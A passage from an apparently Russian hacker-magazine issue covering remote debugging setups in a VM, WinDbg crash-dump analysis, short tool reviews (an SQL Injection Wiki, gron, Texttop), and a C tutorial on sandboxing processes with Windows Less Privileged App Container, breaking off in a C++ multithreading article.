ЗАКЛЮЧЕНИЕ
Безвозвратно удалить информа цию непросто, а сделать это быстро —
еще сложнее. И если магнитный жес ткий диск при наличии свобод ного вре‐
мени можно очистить целиком и полностью, то в слу чае с SSD дела обстоят
куда более запутанно. Надеемся, что эта статья поможет тебе найти опти‐
мальную стратегию уничтожения информа ции.
ТРЮКИ





                                                 Nik Zerof
                                                 xtahi0nix@gmail.com


ИСКУССТВО
 УДАЛЕННОЙ ОТЛАДКИ
 ГОТОВИМ ИНСТРУМЕНТАРИЙ ДЛЯ РАБОТЫ
        С ЯДРОМ И ВИРУСАМИ



Необходимость в отладке программ, запущенных внутри
виртуалки, может возникнуть, когда ты пишешь компонент
ядра, драйвер или же занимаешься вирусной аналитикой
и не хочешь заразить основную машину. Существует нес‐
колько инструментов, которые позволяют это сделать. Нас‐
троить их с первого раза может быть непросто, так что давай
посмотрим, какими они бывают и как с ними обращаться.


УСТАНОВКА И НАСТРОЙКА ВИРТУАЛЬНОЙ МАШИНЫ
Чтобы начать наши эксперименты, необ ходимо установить саму виртуальную
среду. Кто‐то предпочитает VirtualBox, но мы будем использовать VMware
Workstation, потому что VirtualBox с некото рыми инструментами удаленной
отладки  дружит несколько  хуже и  требует допол нительной настройки.
С VMware таких проб лем нет. В качестве целевой операционной системы мы
будем использовать Windows 10 x64 LTSB. Настоятельно рекомендуется сра‐
зу же создать общую папку для удоб ной переб роски файлов с хостовой ОС
на гостевую. Также следует выбрать тип микропрограммы BIOS, а не UEFI.
Это делается для совместимости с некоторыми отла дочными компонентами,
которые мы будем использовать.





                  Нас трой ка виртуальной машины


             INFO

                    Во  время  отладки  на  компьютере  зачастую
                      запущено несколько требовательных  к объему
                      оперативной памяти приложе ний: сама виртуаль‐
                       ная машина, компилятор, браузер. Для комфор‐
                       тной работы понадобится как минимум 8 Гбайт.



УДАЛЕННАЯ ОТЛАДКА В MICROSOFT VISUAL STUDIO
Популярная IDE Microsoft Visual Studio также поддерживает средства удален‐
ной отладки. Чтобы ими вос пользовать ся, тоже понадобится виртуальная
машина, с сервером отладки Visual Studio Remote Tools. Обрати внимание: он
должен подходить к той вер сии Visual Studio, из которой ты хочешь подклю‐
чаться.
   Также я рекомен дую отключить аутентификацию на сервере отладки, что‐
бы всякий раз не вводить учетные данные поль зователя. Для этого зай ди
в «Сервис → Параметры», выбери режим «Без аутентификации» и включи
чекбокс «Разрешить отладку любому пользователю».





                Нас трой ка Visual Studio Remote Tools

Сервер запущен, настроен и слушает порт 4022 на предмет подключения
отладчика.





             Готовый к работе уда ленный отладчик Microsoft

Теперь переходим в Visual Studio для нас тройки проекта под удаленную
отладку. Для начала нам нужно открыть свой ства про екта и перей ти на вклад‐
ку «Отладка». В строке «Удаленная команда» нужно задать путь до отлажива‐
емого файла, в пунктах «Рабочий каталог» и «Каталог развертывания» указать
каталог с отлаживаемым файлом. Также необ ходимо задать имя удаленного
сервера (его можно взять в окне сервера отладки в виртуальной машине)
и выбрать тип подключения «Без аутентифика ции». Теперь заходим в «Дис‐
петчер конфигураций» и ставим чекбокс в столбце «Разверты вание» нап‐
ротив нашего проекта.
   Теперь все готово к удаленной отладке, которую можно начать, выб рав
в меню «Отладка» пункт «Начать отладку» либо нажав F5. Visual Studio, кстати,
позволяет подсоединять ся к уда ленному процес су в виртуальной машине.
Для этого нужно выбрать в меню «Отладка» «Присоединиться к процессу» и в
появившемся окне — удаленный сервер и процесс.





                Нас трой ка Visual Studio Remote Tools

Ура! Visual Studio пол ностью готова к удален ной отладке.


УДАЛЕННАЯ ОТЛАДКА С IDA STARTER
С некоторого времени популярный и весь ма мощный дизас семблер IDA Pro
стал распространяться бесплатно для час тно го использования. Разуме ется,
речь идет о его урезанной версии — IDA Starter. Основная функция этого инс‐
трумента — статический ана лиз, но, помимо этого, он умеет удаленно отла‐
живать приложе ния. Сейчас мы раз беремся, как его настроить для удаленной
отладки.
   Итак, в корневой папке IDA ты найдешь каталог dbgsrv, внутри которого
есть несколько серверов под раз ные ОС и архитектуры процессора. Если ты
собираешься отлаживать 64‐разрядные приложения, то на гос тевой ОС
необходимо запустить файл win64_remote64.exe, пред варительно скопиро‐
вав его в виртуальную машину. Пос ле запус ка он сооб щит нам IP отладочного
сервера и порт, через который происхо дит отладка. Если необходимо запус‐
тить этот сервер с возможностью авториза ции, прос то добавь параметр ‐P
и пароль при запуске сервера отладки.
   Теперь переходим на основную машину, чтобы нас троить удаленную
отладку в самой IDA.





                 Сер вер IDA на целевой машине

Для настройки отладчика в IDA открывай меню Debugger → Select debugger
или жми F9. Теперь в списке доступных отладчиков выбирай Remote Windows
Debugger. Появится окно, предуп режда ющее о рисках дебага, отвечай
утвердительно, если понимаешь их. :‐)
   Теперь появится окно нас тройки уда лен ного отладчика, где следует
задать путь к отлаживаемо му файлу и рабочей папке, а также IP и порт сер‐
вера отладки на удаленной машине. Всю эту информацию можно получить
в виртуальной машине, которую мы уже настроили.





      Настройка параметров подключения уда лен ного отладчика IDA

После ввода всех данных нажимаем «Ок» — и уда ленный отладчик IDA готов
к работе (цвет его фона станет лазурным).





                   Уда ленный отладчик IDA в работе


НАСТРОЙКА WINDBG/VIRTUALKD
Чтобы ускорить удаленную отладку с WinDbg, был создан специальный инс‐
трумент‐надстройка — VirtualKD. Он зна чительно упрощает привязку WinDbg
к виртуальной машине и авто матизирует некото рые настройки целевой опе‐
рационки. Чтобы VirtualKD работал, в основной ОС уже должен стоять WinDbg
и в нем должны быть прописаны пути для отладочных символов.
  После распаковки архива с VirtualKD в его корневой папке появится папка
под названием target. Ее необ ходимо скопировать на целевую ОС, после
этого запустить файл vminstall.exe. Это основной установщик компонентов
VirtualKD на целевую ОС, он копирует необходимые файлы и нас траивает ОС
для работы в режиме отладки. В нем необходимо включить чекбоксы Set Virtu‐
alKD boot entry as default и Replace kdcom.dll, пос ле этого нажать кнопку Install.
   Когда все компоненты будут настроены, необходимо открыть файл kd‐
patch.reg из папки target. Он внесет необходимые изменения в реестр
целевой ОС, чтобы компоненты агента VirtualKD запускались при ее старте.
После этих шагов необ ходимо перезагрузить виртуальную машину.





                Установка VirtualKD на целевой машине

При загрузке гостевой ОС появится диалог, в котором следует выбрать Dis‐
able Signature Enforcement Manually и нажать F8. Теперь выбирай пункт
«Отключение обязательной проверки подписи драйверов».





                            Заг рузка ОС





        Отклю чение обязательной проверки подписи драй веров

На основной ОС осталось только запус тить монитор виртуальной машины
(vmmon64.exe) и нажать в нем кно почку Run debugger, которая запустит уже
подклю ченный к целевой ОС отладчик WinDbg. Обрати внимание на графу OS
в списке подключенных виртуальных машин: здесь должно быть слово yes,
если виртуальная машина настро ена правиль но и агент VirtualKD на ней
запустился и работает. И желательно снять чекбоксы, чтобы VirtualKD не оста‐
навливал целевую ОС, когда не следует.





                   Монитор VirtualKD


АНАЛИЗ АВАРИЙНОГО ДАМПА ПРИ ПОМОЩИ WINDBG
Итак, инструментарий для удален ной отладки на все случаи жизни у нас под‐
готовлен и настроен. Но если с IDA Pro или Visual Studio ты без труда смо‐
жешь начать работать, то с отладкой в режиме ядра могут воз никнуть опре‐
деленные сложности. Давай посмотрим, что делать, если запуск драйвера
обернулся BSOD и нам надо в этом разоб раться.
  Предположим, что мы запустили вир туальную машину, загрузили в нее
наш драйвер и не забыли включить отладчик через монитор  VirtualKD.
Посылаем драйверу зап рос IOCTL, чтобы он выполнил нужный блок кода,
который и привел к BSOD. Пос ле этого вир туальная машина остановилась,
и отладчик сообщил о сбое, предложив исполнить команду !analyze ‐v.
Выпол няем ее, и WinDbg показывает анализ дампа сбоя, из которого мы
будем получать основную информа цию. Давай разберем самые значимые
для нас поля.


Где искать дам пы
Если мы отлаживаем собственный драйвер, то знаем, когда может произойти
сбой, и держим нагото ве отладчик, подключенный к виртуальной машине.
Но если ОС падает в BSOD неожиданно, нам требуется вручную загрузить
файл аварийного дампа в отладчик, что бы понять, что выз вало сбой. Windows
создает файл полного аварийного дампа автомати чески и называет его MEM‐
ORY.DMP. Он располагается в корневой пап ке ОС, а мини‐дамп ты найдешь
в папке minidump.


Приглашение WinDbg начинается с баннера Bugcheck Analysis и содержит
ссылку на команду !analyze  ‐v, которая загрузит крешдамп в отладчик
и разберет его. Выпол няем команду и видим примерно сле дующее (креш‐
дамп большой, я покажу его начало).


SYSTEM_SERVICE_EXCEPTION (3b)
An exception happened while executing a system service routine.
Arguments:
Arg1: 00000000c0000005, Exception code that caused the bugcheck
Arg2: fffff801033e1722, Address of the instruction which caused the
bugcheck
Arg3: ffff890143778d20, Address of the context record for the except
ion that caused the bugcheck
Arg4: 0000000000000000, zero.
Debugging Details:
‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
DUMP_CLASS: 1
DUMP_QUALIFIER: 0
BUILD_VERSION_STRING:  14393.2068.amd64fre.rs1_release.180209‐1727
DUMP_TYPE:  0
BUGCHECK_P1: c0000005
BUGCHECK_P2: fffff801033e1722
BUGCHECK_P3: ffff890143778d20
BUGCHECK_P4: 0
EXCEPTION_CODE: (NTSTATUS) 0xc0000005
...

Крешдамп сообщает об ошиб ке SYSTEM_SERVICE_EXCEPTION (3b). MSDN
говорит, что она происхо дит из‐за исключения, вызванного при переходе
из непривилегированного кода (режим пользователя) в привиле гированный
(режим ядра). В глаза бросается строчка EXCEPTION_CODE, которая показы‐
вает ошибку NTSTATUS, о ней ты можешь про честь по ссылке. Получается,
произошло нарушение дос тупа, STATUS_ACCESS_VIOLATION. Читаем дамп
дальше.


CONTEXT:  ffff890143778d20 ‐‐ (.cxr 0xffff890143778d20)
rax=0000000000000000 rbx=ffffb104c7a5c850 rcx=0000000000000000
rdx=0000000040000010 rsi=0000000000000001 rdi=ffffb104c6ed0ab0
rip=fffff801033e1722 rsp=ffff890143779720 rbp=0000000000000002
r8=ffffb104c82daa0c  r9=ffff8901437797d8 r10=0000000000000000
r11=ffff890143779758 r12=0000000000000000 r13=ffffb104c6b2b970
r14=ffffb104c7a5c850 r15=0000000000000000

Здесь мы видим состояние регистров про цес сора на момент сбоя.


DEFAULT_BUCKET_ID:  WIN8_DRIVER_FAULT
BUGCHECK_STR:  0x3B
PROCESS_NAME:  loader.exe

Поле DEFAULT_BUCKET_ID говорит нам о категории сбоя, BUGCHECK_STR
показывает сокращен ный код сбоя, PROCESS_NAME указывает на название
процесса, к которому был подключен про цес сор на момент BSOD. В данном
случае процесс loader.exe послал запрос IOCTL к драйверу, который
и обрушил систему.


FOLLOWUP_IP:
testdrv!MmGetSystemAddressForMdlSafe+12
fffff801`033e1722 0fbf400a        movsx   eax,word ptr [rax+0Ah]

В этой части отладчик ука зывает на конкретное место сбоя в формате [
модуль]![функция+смещение]. Здесь модуль называется testdrv, функция
MmGetSystemAddressForMdlSafe и смещение 12. Далее идет ассемблерный
код места сбоя.


MODULE_NAME: testdrv
IMAGE_NAME:  testdrv.sys

Здесь IMAGE_NAME указывает на наз вание файла, а MODULE_NAME — на наз‐
вание объекта.
  Мы рассмот рели основные поля ава рийного дампа, но не все, потому что
некоторые из них дублируются, дру гие предос тавля ют избыточную информа‐
цию. В любом случае, изу чив вывод команды !analyze ‐v, ты соберешь
немало информации. Конечно, это не все: поиск ошибок в драйверах отни‐
мает немало сил и времени даже у опытных системных программистов, но это
хороший старт в отладке и трассировке системного кода.


ЗАКЛЮЧЕНИЕ
Мы рассмотрели основной инс тру ментарий уда ленной отладки, нас троили
виртуальную машину и попытались разобрать ава рийный дамп операционной
системы. На самом деле тема отладки приложений весьма обширна, и слож‐
но уместить все в одной статье, но задать нуж ное направление для самос‐
тоятельного изучения можно. Надеюсь, что этот материал поможет тебе
в работе.
ТРЮКИ





                       Андрей Письменный
                         Шеф‐редактор
                           apismenny@gmail.com



      SQL INJECTION WIKI — КОЛЛЕКЦИЯ ПРИМЕРОВ SQL-
      ИНЪЕКЦИЙ
       Иссле дователи ИБ из компании NetSPI собрали неплохую подборку1       самой разной информа ции, связанной с SQL‐инъ екциями. Эта тех‐
        ника атак на веб‐приложения хорошо известна и широко применя‐
        ется с тех времен, когда сайты ста ли делать на основе баз данных.
      И до сих пор она считается одной из самых опасных.





      Материалы SQL Injection Wiki поделены по темам: детектирование
         уязвимости, идентифика ция СУБД, типы инъекций, техники, разные
       виды запросов и в самом конце — подборки ссылок на ути литы.
       Почти в каждом из раз делов можно выб рать между MySQL, Oracle
        и MS SQL Server. Вся информа ция на английском, но примеры кода
        в основном говорят сами за себя.
         Предполагается, что SQL Injection Wiki будет пополняться, но и
        в текущем варианте это полезный ресурс для начинающих мастеров
        кавычки. Все исходники сайта доступны на GitHub, где ты можешь
        скачать их целиком или предложить свое дополнение.


      GRON — УТИЛИТА, КОТОРАЯ ОБЛЕГЧАЕТ РАБОТУ С JSON
      ИЗ КОМАНДНОЙ СТРОКИ
       Данные в формате JSON лег ко загружать и сохранять в своих прог‐2        раммах, а вот через терминал работать с сериализованными объ‐
         ектами далеко не так просто. Автор утилиты gron решил исправить
          это, сделав так, чтобы по файлам в JSON можно было искать
        с помощью grep, сравнивать их через diﬀ и так далее.
          Скар мливаем gron файл в формате JSON (или сами данные через
           stdin), и gron раз бивает его на отдельные строки в формате


        json[номер].свойство.свойство = значение;

      В сумме все строки сос тавляют код на JavaScript, генерирующий
       объект, аналогичный тому, который будет создан при простой заг‐
        рузке JSON. Но главная фича — в дру гом. Такие строки легко скор‐
        мить на вход grep и получить только нуж ные поля.





               Тестиру ем тра диционно на нашем каталоге даркнета

        Также автор предлагает совмещать это с обратным пре образова‐
       нием (ungron). Можно написать что‐то в таком духе:


        gron testdata/two.json | grep likes | gron ‐u

        Тогда grep отфильтрует только строки со словом likes, соответству‐
      ющие нужным объектам, а ungron соберет их обратно в JSON. Таким
       образом можно манипулировать данными в JSON.
          Автор признает, что это менее мощный способ, чем утилита jq (я
       о ней писал в одном из прошлых выпус ков), однако постичь gron
        значительно про ще.
          Установить его можно из ис ходников либо выбрав готовый
        исполняемый файл для своей системы. Также доступны пакеты
        для Go (go get ‐u github.com/tomnomnom/gron) и для маковского
       менеджера Brew (brew install gron).


      TEXTTOP — ГРАФИЧЕСКИЙ БРАУЗЕР, КОТОРЫЙ РАБОТАЕТ
      В ТЕРМИНАЛЕ
       Не все из проектов, о которых я пишу в руб рике WWW, имеют прак‐3        тическую ценность, но штукови не под наз ванием Texttop, кажется,
        удалось побить все мыслимые рекорды бес полезности. Единс твен‐
        ное достоинство графичес кого десктопа, который передается через
         текстовый терминал, — это завораживающая смелость всей затеи.
         Испытать Texttop нес ложно — собирать из исходников ничего
        не придется. Программа рас пространяет ся в виде контей нера
         Docker, скачать и поднять который можно одной строчкой:


        docker run ‐‐rm ‐it tombh/texttop sh

       Запускаем скрипт run.sh, и перед нами… кажется, Firefox с откры‐
        той поисковой стро кой.





        Автор утверждает, что смысл его проекта в том, чтобы пользоваться
        интернетом при  экс тремально плохом соединении  (3  Кбит/с).
       На личном сервере он запус кает Texttop, подключается по SSH
        и таким образом может даже посмотреть Gangnam style на YouTube
         (правда, без звука).





      Меня же постигло полное фиас ко: в стандартном маковском тер‐
        минале у Texttop не зарабо тала мышь, приб лижать и удалять сочета‐
       нием из кнопки Ctrl и скролла не удалось, потому что в macOS оно
        уже занято системным зумом, да и остальные хоткеи, кажется,
        не срабатывают.
         Из терминалов, где Texttop будет работать настолько хорошо,
        насколько это возможно, автор называ ет Tilda и Terminal из Ubuntu.
       Наверное, я мог бы пос тавить Ubuntu в виртуал ку и запус тить все
        это хозяйство там, но что‐то меня оста нови ло. Возможно, смутное
       понимание того, что это в целом какой‐то неправильный способ
        использовать компьютер.
КОДИНГ
 СИСТЕМНЫЙ
  ИЗОЛЯТОР





                                                                                         Nik Zerof
                                                                                             xtahi0nix@gmail.com





ИЗОЛИРУЕМ ПРОЦЕССЫ В WINDOWS
С ПОМОЩЬЮ LESS PRIVILEGED APP CONTAINER




Начиная с восьмой версии в Windows появился встроенный
механизм контейнеров, которые позволяют изолировать
процессы путем значительного усечения их прав. Этому сис‐
темному механизму дали название Less Privileged App Con‐
tainer  (LPAC), он поддерживается некоторыми приложе‐
ниями, например браузером Chrome. В этой статье я покажу,
как использовать его в сво их программах.


Сендбокс‐изоляция часто применя ется в защитных приложениях, а также
на ее основе строятся компоненты антивиру сов, называемые HIPS (Host‐
based Intrusion Prevention System), и отдельные приложения для изолирован‐
ных сред типа Sandboxie. Такие защитные механиз мы реализованы через
драйвер‐фильтр режима ядра. Он сло жен в написании и тес тировании, имеет
громадное количество шаблонного кода и должен перехватывать значитель‐
ное количество функций NTAPI, чтобы менять их параметры на лету, таким
образом создавая песочницу внутри файловой сис темы.
  Существует более прос той спо соб устроить изоляцию произвольных при‐
ложений. Инже неры Microsoft уже позаботились об этом и интегрировали
интересный механизм в ядро Windows. Его суть заключается в том, что сис‐
тема жестко ограничивает доступ  к устройствам (таким как микрофон,
камера, GPS или модуль 4G), файлам в системе (иногда — даже для чте ния)
и процессам (ограничиваются межпроцес сные вза имодействия). Также огра‐
ничения накладываются на работу с сетью (например, на откры тие портов
или сокетов), обращения к сетевому реес тру и оконному интерфейсу других
приложений.
   Когда приложе ние запущено внутри LPAC, все разрешения ему требуется
выдавать явно. Это весь ма полезный механизм с точки зрения безопасности,
если в приложении есть уяз вимости, которые зло умышленник может исполь‐
зовать для повышения привилегий и доступа к дру гим ресурсам. Если уязвим,
например, браузер, то такую атаку можно выполнить удаленно. Кроме того,
когда запускаешь неизвестное приложение, неп лохо было бы обе зопасить
себя от несанкционированных действий с его стороны, научившись запускать
приложения в контейнере LPAC.


СОЗДАЕМ LESS PRIVILEGED APP CONTAINER
Прежде чем запускать приложение, нам нуж но создать сам контейнер. В этом
нам поможет функция WinAPI CreateAppContainerProfile. Вот ее прототип:


HRESULT WINAPI CreateAppContainerProfile(
  _In_  PCWSTR              pszAppContainerName,
  _In_  PCWSTR              pszDisplayName,
  _In_  PCWSTR              pszDescription,
  _In_  PSID_AND_ATTRIBUTES pCapabilities,
  _In_  DWORD               dwCapabilityCount,
  _Out_ PSID                *ppSidAppContainerSid
);

И сам код создания кон тейнера:


WCHAR sandbox_name[] = L"SandboxLPAC";
WCHAR sandbox_desc[] = L"My SandboxLPAC";
PSID sid = NULL;
HRESULT status;
result = CreateAppContainerProfile(sandbox_name, sandbox_name, sandbo
x_desc, NULL, 0, &sid);

В случае ошибки неплохо было бы проверить, не создан ли наш контейнер
ранее; если создан, то мы получим его SID. Вот прототип функции WinAPI,
которая выясняет SID уже соз данного контейнера:


HRESULT WINAPI DeriveAppContainerSidFromAppContainerName(
  _In_  PCWSTR pszAppContainerName,
  _Out_ PSID   *ppsidAppContainerSid
);

Далее код реализации проверки. Как видишь, он очень прост.


if (HRESULT_CODE(status) == ERROR_ALREADY_EXISTS)
status = DeriveAppContainerSidFromAppContainerName(sandbox_name, &sid
);

Так или иначе мы получа ем SID контейнера.


             INFO

                           Security Identiﬁer (SID) — идентификатор безопас‐
                         ности,  структура данных  в  Windows,  которая
                     может идентифицировать  системные объекты,
                       например элемен ты управления доступом (Ac‐
                        cess Control Entries, ACE), токены доступа (Access
                          Token), дескрип торы безопасности (Security De‐
                              scriptor). SID всегда начинается с буквы S, далее
                        идут числа, которые обозначают номер редакции
                     ОС, источники выдачи, удостоверяющие центры
                      и другую информацию.



ПИШЕМ LPAC LOADER ДЛЯ ЛЮБОГО ПРИЛОЖЕНИЯ
Итак, контейнер LPAC соз дан, SID получен. Теперь наша задача — зас тавить
Windows запустить произвольное приложение в этом контейнере. Но сначала
нам необходимо разоб рать процесс запуска приложений и понять, как можно
задавать определен ные атрибуты запус ка и какие сис темные структуры отве‐
чают за это.
  Для запуска приложений в Windows используется функция WinAPI Cre‐
ateProcess с массой параметров, и именно эта функция имеет ключевое
значение в нашей задаче. Давай посмотрим на ее прототип и разберем
основные параметры.


BOOL WINAPI CreateProcess(
  _In_opt_    LPCTSTR               lpApplicationName,
  _Inout_opt_ LPTSTR                lpCommandLine,
  _In_opt_    LPSECURITY_ATTRIBUTES lpProcessAttributes,
  _In_opt_    LPSECURITY_ATTRIBUTES lpThreadAttributes,
  _In_        BOOL                  bInheritHandles,
  _In_        DWORD                 dwCreationFlags,
  _In_opt_    LPVOID                lpEnvironment,
  _In_opt_    LPCTSTR               lpCurrentDirectory,
  _In_        LPSTARTUPINFO         lpStartupInfo,
  _Out_       LPPROCESS_INFORMATION lpProcessInformation
);

Поле lpApplicationName — это путь к исполняемому файлу, который мы
собираемся запускать. Далее идут поля lpCommandLine, lpProcessAttrib‐
utes, lpThreadAttributes, bInheritHandles, которые сейчас не пред став‐
ляют для нас интереса. Можем им всем присвоить значение NULL (FALSE).
  А вот на поле dwCreationFlags мы остановимся подробнее. Оно отве чает
за флаги, которые устанавлива ют приори тет процесса и регламентируют его
создание. Например, если в это поле передать зна чение CREATE_NO_WINDOW
для консольного приложения, то оно запустится без соз дания консольного
окна. А если передать зна чение CREATE_SUSPENDED, тогда процесс (основной
поток) будет создан приостановленным (в состоянии ожидания пробуждения
функцией ResumeThread). Нам же необ ходимо задать флаг EXTENDED_STAR‐
TUPINFO_PRESENT: он «разрешит» нам расширенные параметры запуска при‐
ложения.
  Далее идет поле lpStartupInfo, которое имеет тип LPSTARTUPINFO.
Это указатель на структуру STARTUPINFO, которая регламентиру ет параметры
основного окна приложения или терминала, а также его дескриптор.
  Важный момент. При передаче флага запуска EXTENDED_STARTUPINFO_P‐
RESENT мы можем вместо стандартной структуры STARTUPINFO передать ее
усовершенствованную версию — структуру STARTUPINFOEX. Она имеет вид:


typedef struct _STARTUPINFOEX {
  STARTUPINFO                 StartupInfo;
  PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
} STARTUPINFOEX, *LPSTARTUPINFOEX;

Можно считать, что это стандартная структура STARTUPINFO (поле Star‐
tupInfo), дополненная списком атрибутов запус ка (поле lpAttributeList).
Эти  атрибуты можно проинициализировать функци ей  WinAPI Initial‐
izeProcThreadAttributeList:


BOOL WINAPI InitializeProcThreadAttributeList(
  _Out_opt_  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  _In_       DWORD                        dwAttributeCount,
  _Reserved_ DWORD                        dwFlags,
  _Inout_    PSIZE_T                      lpSize
);

А теперь добавляем их в список параметров функци ей UpdateProcThreadAt‐
tribute:


BOOL WINAPI UpdateProcThreadAttribute(
  _Inout_   LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  _In_      DWORD                        dwFlags,
  _In_      DWORD_PTR                    Attribute,
  _In_      PVOID                        lpValue,
  _In_      SIZE_T                       cbSize,
  _Out_opt_ PVOID                        lpPreviousValue,
  _In_opt_  PSIZE_T                      lpReturnSize
);

Обрати внимание на поле PVOID lpValue, к нему мы еще вернемся. А теперь
переходим к практике. Весь код манипуляций с атрибутами потоков выглядит
таким образом:


SIZE_T size_of_attr = 0;
STARTUPINFOEX ex_start_info = { 0 };
SECURITY_CAPABILITIES secap = { 0 };
InitializeProcThreadAttributeList(NULL, 1, NULL, &size_of_attr);
ex_start_info.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(
size_of_attr);
InitializeProcThreadAttributeList(ex_start_info.lpAttributeList, 1,
NULL, &size_of_attr);
UpdateProcThreadAttribute(ex_start_info.lpAttributeList,
                0,
                PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES,
                &secap,
                sizeof(secap),
                NULL,
                NULL);

Первые три строки кода (если не считать объявление переменных) создают
PROC_THREAD_ATTRIBUTE_LIST, то есть список параметров запуска. Вызов
WinAPI UpdateProcThreadAttribute модифицирует его должным образом
и создает нужную нам структуру STARTUPINFOEX ex_start_info, которую мы
передадим функции CreateProcess. Чет вертое поле этой функции, lpValue,
получает на вход структуру secap, которая имеет тип SECURITY_CAPABILI‐
TIES и выглядит так:


typedef struct _SECURITY_CAPABILITIES {
  SID                  AppContainerSid;
  PSID_AND_ATTRIBUTES  Capabilities;
  DWORD                CapabilityCount;
  DWORD                Reserved;
} SECURITY_CAPABILITIES, *PSECURITY_CAPABILITIES;

Чтобы «настроить» ее под свои нужды, заполняем поля перед вызовом Up‐
dateProcThreadAttribute. Первое поле структуры — это AppContainerSid,
в него мы передаем SID нашего контейнера LPAC. Второе поле — Capabili‐
ties, оно тоже является структурой:


typedef struct _SID_AND_ATTRIBUTES {
  PSID  Sid;
  DWORD Attributes;
} SID_AND_ATTRIBUTES, *PSID_AND_ATTRIBUTES;

Третье  поле   (SECURITY_CAPABILITIES)  называется  CapabilityCount.
Это счетчик параметров процес са, которыми мы его наделяем.
  Давай посмотрим на код, который реализует все перечисленное выше
и создает нам корректно заполненную структуру SECURITY_CAPABILITIES.


    SID_AND_ATTRIBUTES sid_attr;
    DWORD sid_size = SECURITY_MAX_SID_SIZE;
    sid_attr = (SID_AND_ATTRIBUTES *)malloc(sizeof(SID_AND_ATTRIBUTES
));
    ZeroMemory(secap, sizeof(SECURITY_CAPABILITIES));
    ZeroMemory(sid_attr, sizeof(SID_AND_ATTRIBUTES));
    sid_attr.Sid = malloc(SECURITY_MAX_SID_SIZE);
    CreateWellKnownSid(capabili, NULL, sid_attr.Sid, &sid_size);
    sid_attr.Attributes = SE_GROUP_ENABLED;
    &secap‐>Capabilities = sid_attr;
    &secap‐>AppContainerSid = sid;

Единственная сложность, которую ты можешь встретить в этом коде, зак‐
лючается в неизвестной еще функции CreateWellKnownSid. Она создает SID
для значений, которые были предопределены заранее. Самое инте ресное
для нас — это ее первое поле, в котором через переменную capabili
передается  перечисление  типа  WELL_KNOWN_SID_TYPE,  где  на момент
написания статьи содержится 94 пункта. Они наделя ют наш SID различными
правами. Ознакомиться с полным списком мож но в MSDN по ссылке.
Для собственных экспериментов мож но выб рать любой по вку су. :‐)
   Итак, все основные сис темные структуры соз даны, сам контейнер LPAC
создан, осталось только запустить блокнот в контейнере. Зададим нужные
параметры вызова и наши заранее подготовленные структуры.


    PROCESS_INFORMATION pinfo = { 0 };
    BOOL ok = CreateProcessA("c:\\windows\\notepad.exe",
                    NULL,
                    NULL,
                    NULL,
                    FALSE,
                    EXTENDED_STARTUPINFO_PRESENT,
                    NULL,
                    NULL,
                    (LPSTARTUPINFOA)&ex_start_info,
                    &pinfo);

Результат работы можно увидеть в программе ProcessExplorer: notepad.exe
запустится внутри контейнера Less Privileged App Container.





                   Блокнот внут ри контей нера LPAC


ПРОВЕРКА НА ИЗОЛЯЦИЮ
Как проверить, работает ли процесс в контейнере LPAC или нет, програм‐
мным  путем,  без  использования  сторонних  приложений?  Достаточно
получить хендл интересу ющего нас про цес са. Если процесс сторонний, то
нам поможет функция WinAPI OpenProcess, а для сво его пригодится GetCur‐
rentProcess. Далее открываем токен доступа процесса (Access  token)
и смотрим его TOKEN_INFORMATION_CLASS, который будет равен TokenIsAp‐
pContainer в том случае, если про цесс работает внут ри контейнера.


BOOL InLPAC(HANDLE h_proc)
{
    HANDLE proc_token;
    DWORD len;
    BOOL lpac = 0;
    OpenProcessToken(h_proc, TOKEN_QUERY, &proc_token);
    if (!GetTokenInformation(proc_token, TokenIsAppContainer, &lpac,
sizeof(lpac), &return_len))
        return false;
    return lpac;
}


             INFO

                   Маркер доступа (Access token) — объект Windows,
                      содержащий привилегии учет ной записи поль‐
                        зовате ля,  от которого был запущен процесс.
                    Помимо этого, Access token содержит информа‐
                   цию об ограничениях доступа к потоку, здесь же
                       перечислены SID и списки привилегий процесса.
                     Посмотреть структуру маркера доступа мож но,
                       введя в WinDbg команду dt_TOKEN.


На вход этой функции необходимо передать хендл инте ресующе го нас про‐
цесса, и она вернет TRUE, если процесс работа ет внутри Less Privileged App
Container, и FALSE, если процесс выполняется вне его.


ЗАКЛЮЧЕНИЕ
Мы разобрали Less Privileged App Container, встроенную реализацию изо‐
лированной среды в Windows. Что бы раскрыть тему, нам пришлось детально
рассмотреть про цесс запуска приложений в Windows средствами WinAPI
CreateProcess, а также узнать о нескольких важных системных структурах,
без которых ничего бы не получилось. Я надеюсь, что эта статья поможет
тебе в иссле довании сис темных механиз мов Windows.
КОДИНГ


БЕСПОЩАДНЫЙ
 БУСТ




КАК УСКОРИТЬ
                                                                               deeonisМНОГОПОТОЧНЫЙ КОД                  С++ разработчик,
                                                                         заслуженный автор рубрики
                                                                                    КодингНА C++                                                                                deeonis@gmail.com





Уже много лет твой компьютер умеет выполнять код любимо‐
го ПО параллельно, на всех своих ядрах и процессорах.
Да что там компьютер — ско ро холодильники смогут обсчи‐
тывать гастрономические предпочтения хозяина в несколько
потоков, недаром IoT движется по планете семимильными
шагами. И казалось бы, уже весь софт давным‐давно должен
уметь максимально эффективно наг ревать атмосферу вок‐
руг тебя, нагружая тран зисто ры тво его ПК многопоточ‐
ностью, но все не так замечательно, как хотелось бы.


В мире многопоточ ности существуют две основные проблемы: не все алго‐
ритмы успешно распараллеливаются, а то, что все‐таки удается запустить
на нескольких ядрах, работа ет далеко не так быстро, как хотелось бы. При‐
чина неэффективной работы мультипроцессорного кода (если не говорить
про недостаточно прямые руки программистов) кроется в из лишних зат-
ратах про цессорно го вре мени на син хро низацию дан ных меж ду
ядрами. Да‐да. Это те самые мьютексы, семафоры и прочее, что мы так при‐
выкли использовать в нашем нехитром ремес ле.
  Из этого следует прос той вывод — если есть возможность избежать раз‐
деления данных между ядра ми, то надо этой воз можностью непременно вос‐
пользоваться. Но что делать, если такой воз можнос ти решительно нет?


СФЕРИЧЕСКАЯ ЗАДАЧА В ВАКУУМЕ
Допустим, нам нужно написать серверное приложение, которое принимает
одно‐единственное подключение по UDP‐про токолу и как‐то нехитро обра‐
батывает входящие датаграммы, например считает статистику по пришед шим
данным. Основная проблема в том, что данные идут на очень больших ско‐
ростях, например 10 Гбит/c. Что бы спра виться с такой нагрузкой, нам надо
